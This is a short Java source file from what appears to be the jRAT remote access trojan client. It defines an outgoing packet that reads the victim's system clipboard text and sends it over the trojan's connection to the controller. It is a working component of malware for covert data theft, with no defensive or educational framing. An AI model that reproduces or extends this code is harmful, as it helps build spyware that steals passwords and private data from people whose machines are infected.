package jrat.client.packets.outgoing;

import jrat.client.Connection;

import java.awt.*;
import java.awt.datatransfer.DataFlavor;


public class Packet41Clipboard extends AbstractOutgoingPacket {

	@Override
	public void write(Connection con) throws Exception {
		con.writeLine((String) Toolkit.getDefaultToolkit().getSystemClipboard().getData(DataFlavor.stringFlavor));
	}

	@Override
	public short getPacketId() {
		return 41;
	}

}
